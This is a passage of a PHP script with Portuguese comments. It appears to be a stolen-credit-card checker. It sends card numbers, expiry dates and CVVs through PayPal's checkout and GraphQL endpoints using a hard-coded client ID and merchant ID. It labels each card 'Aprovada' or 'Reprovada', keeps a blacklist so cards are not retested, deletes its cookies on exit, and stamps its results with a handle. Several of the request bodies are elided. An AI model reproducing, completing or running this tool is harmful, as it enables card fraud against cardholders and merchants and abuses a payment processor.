...
// 1 — Define o arquivo de cookie
$cookieFile = __DIR__ . '/cookie.txt';

// 2 — Função que apaga o cookie quando o script finaliza
function limparCookiesOnShutdown($file) {
    if (file_exists($file)) {
        @unlink($file); // apaga silenciosamente
    }
}

// 3 — Executa a limpeza SEMPRE que o script terminar
register_shutdown_function('limparCookiesOnShutdown', $cookieFile);

// 4 — Até erro fatal resulta em limpeza
set_error_handler(function() use ($cookieFile) {
...
$blacklist_file = 'blacklist.txt'; // Nome do arquivo de Blacklist



// Função para adicionar o cartão à Blacklist

function addToBlacklist(string $cc_formatada, string $file) {

    // Evita caracteres que possam quebrar o formato CC|MM|AA|CVV

    if (!preg_match('/^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/', $cc_formatada)) {
    ...
    // Tenta obter um lock para escrita segura
    ...
    if ($file_handle) {
        ...
        if (flock($file_handle, LOCK_EX)) {
            ...
            // Verifica se já existe para evitar redundância (embora a checagem principal seja antes do CURL)

            $content = @file_get_contents($file);

            if (strpos($content, $cc_formatada) === false) {

                @fwrite($file_handle, $cc_formatada . "\n");
...
// ... [Outras funções como generate_contact_info, generate_nome_aleatorio, etc. permanecem as mesmas]
...
// ... [Função executeCurl permanece a mesma]
...
function executeCurl(string $url, string $method, array $headers, ?string $postFields = null): string {
    ...
    // Adicionado tratamento básico de erro para o curl para evitar "Erro na requisição"
...
$cc_formatada = "$cc|$mes|$ano|$cvv"; // Formato do cartão para Blacklist
...
if (file_exists($blacklist_file)) {
    ...
    $blacklist_content = @file_get_contents($blacklist_file);

    if ($blacklist_content !== false && strpos($blacklist_content, $cc_formatada) !== false) {

        // Sai imediatamente se o cartão for encontrado

        die("❌ Reprovada -> $lista -> Reteste Evitado (Blacklist)");
...
if ((int) $ano < 2025 || ((int) $ano === 2025 && (int) $mes < 3)) {
    ...
    // Cartões expirados são Dies e devem ir para a Blacklist

    addToBlacklist($cc_formatada, $blacklist_file);

    die("Reprovada --> $lista --> EXPIRED_CARD");
...
if (file_exists($cookieDir)) {
    ...
    @unlink($cookieDir); // Usa @ para evitar erro se o arquivo não puder ser deletado

}



// ... [Seu código de execução do CURL (request 1 - smart/buttons) ]

$response = executeCurl(

    "https://www.paypal.com/smart/buttons?style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&fundingSource=paypal&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_492a535db5_mty6mjg6nde&customerId=&clientID=AXvC3Esmc176nITd8oIUiVWMG0c6n-VJnJPcIaVSE-t1I-Qnulxu4OHCwDN80h_kF-NcZnK3Ai0LRxHR&clientMetadataID=uid_1a960bc26e_mty6mjg6nde&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=paylater&enableFunding.1=venmo&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.defaultBlueButtonColor=gold&experiment.venmoEnableWebOnNonNativeBrowser=false&flow=purchase&fundingEligibility=&intent=capture&locale.country=US&locale.lang=en&merchantID.0=KZTE6QC49FDL8&hasShippingCallback=false&platform=desktop&renderedButtons.0=paypal&sessionID=uid_1a960bc26e_mty6mjg6nde&sdkCorrelationID=prebuild&sdkMeta=&sdkVersion=5.0.474&storageID=uid_fd4b7e505d_mty6mjg6nde&supportedNativeBrowser=false&supportsPopups=true&vault=false",
...
// ... [Seu código de execução do CURL (request 2 - v2/checkout/orders) ]
...
// ... [Seu código de execução do CURL (request 3 - graphql) ]
...
$msg = $jsonResponse->errors[0]->message ?? "N/A";





$messages = ["INVALID_SECURITY_CODE", "is3DSecureRequired"];



$binchecker = getFluidpayDetails(substr($cc, 0, 6))['details'];

$ReturnCode = "$binchecker - $code ($msg)";
...
if (in_array($code, $messages)) {
    ...
    // --- RESULTADO APROVADA: ADICIONA À BLACKLIST ---

    addToBlacklist($cc_formatada, $blacklist_file);

    echo "✅ Aprovada -> $lista -> $ReturnCode -> @Patriota171";

} elseif (strpos($msg, "TRANSACTION_REFUSED") !== false) {

    // --- RESULTADO APROVADA (CVV MATCH): ADICIONA À BLACKLIST ---

    addToBlacklist($cc_formatada, $blacklist_file);

    echo "✅ Aprovada -> $lista -> CVV MATCH -> @Patriota171";

} else {

    // --- RESULTADO REPROVADA: ADICIONA À BLACKLIST ---

    addToBlacklist($cc_formatada, $blacklist_file);

    echo "❌ Reprovada -> $lista -> $ReturnCode -> @Patriota171";

}

// O CURL_ERROR não será adicionado à blacklist, pois o script morre antes.
